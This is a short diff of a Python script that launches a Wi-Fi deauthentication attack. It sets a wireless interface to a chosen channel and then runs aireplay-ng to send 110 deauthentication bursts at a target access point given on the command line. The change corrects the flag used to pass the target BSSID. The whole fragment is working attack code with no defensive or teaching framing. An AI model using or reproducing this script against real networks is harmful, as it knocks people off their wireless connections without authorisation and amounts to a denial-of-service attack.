@@ -26,5 +26,5 @@ interface = get_interface()
 
 command = "iwconfig " + interface + " channel " + sys.argv[2]
 subprocess.Popen(command.split(), stdout=subprocess.PIPE)
-command = "aireplay-ng -0 110 -x 2 -" + sys.argv[1] + " " + interface
+command = "aireplay-ng -0 110 -a " + sys.argv[1] + " " + interface
 subprocess.Popen(command.split(), stdout=subprocess.PIPE)
